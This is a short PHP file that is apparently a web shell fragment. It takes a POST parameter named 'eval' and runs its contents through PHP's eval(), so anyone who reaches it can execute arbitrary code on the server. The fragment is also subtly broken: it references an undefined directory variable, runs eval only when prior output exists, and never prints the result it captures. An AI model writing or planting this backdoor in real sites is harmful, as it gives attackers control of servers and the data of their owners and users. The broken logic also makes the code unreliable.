<?php
$eval = $_POST['eval'];
if (!empty($eval)) 
{ 
    $tmp = ob_get_contents(); 
    $olddir = realpath("."); 
    @chdir($d); 
    if ($tmp) 
    { 
        ob_clean(); 
        eval($eval); 
        $ret = ob_get_contents(); 
        $ret = convert_cyr_string($ret,"d","w"); 
        ob_clean(); 
        echo $tmp; 
    }
} 
  
?>